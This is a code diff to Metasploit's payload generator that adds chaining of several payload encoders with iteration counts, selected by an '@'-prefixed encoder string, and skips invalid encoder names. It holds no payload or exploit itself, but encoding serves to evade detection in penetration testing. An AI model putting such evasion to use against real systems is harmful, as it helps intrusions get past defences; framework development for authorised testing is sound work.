@@ -205,6 +205,19 @@ module Msf
       chosen_platform
     end
 
+    def multiple_encode_payload(shellcode)
+      encoder_str = encoder[1..-1]
+      encoder_str.scan(/([^:, ]+):?([^,]+)?/).map do |encoder_opt|
+        @iterations = (encoder_opt[1] || 1).to_i
+        @iterations = 1 if iterations < 1
+
+        encoder_mod = framework.encoders.create(encoder_opt[0])
+        encoder_mod.datastore.import_options_from_hash(datastore)
+        shellcode = run_encoder(encoder_mod, shellcode)
+      end
+      shellcode
+    end
+
     # This method takes the shellcode generated so far and iterates through
     # the chosen or compatible encoders. It attempts to encode the payload
     # with each encoder until it finds one that works.
@@ -327,7 +340,12 @@ module Msf
       else
         raw_payload = generate_raw_payload
         raw_payload = add_shellcode(raw_payload)
-        encoded_payload = encode_payload(raw_payload)
+
+        if encoder != nil and encoder.start_with?("@")
+          encoded_payload = multiple_encode_payload(raw_payload)
+        else
+          encoded_payload = encode_payload(raw_payload)
+        end
         encoded_payload = prepend_nops(encoded_payload)
         cli_print "Payload size: #{encoded_payload.length} bytes"
         gen_payload = format_payload(encoded_payload)
@@ -393,6 +411,10 @@ module Msf
         # Allow comma separated list of encoders so users can choose several
         encoder.split(',').each do |chosen_encoder|
           e = framework.encoders.create(chosen_encoder)
+          if e.nil?
+            cli_print "Skipping invalid encoder #{chosen_encoder}"
+            next
+          end
           e.datastore.import_options_from_hash(datastore)
           encoders << e if e
         end
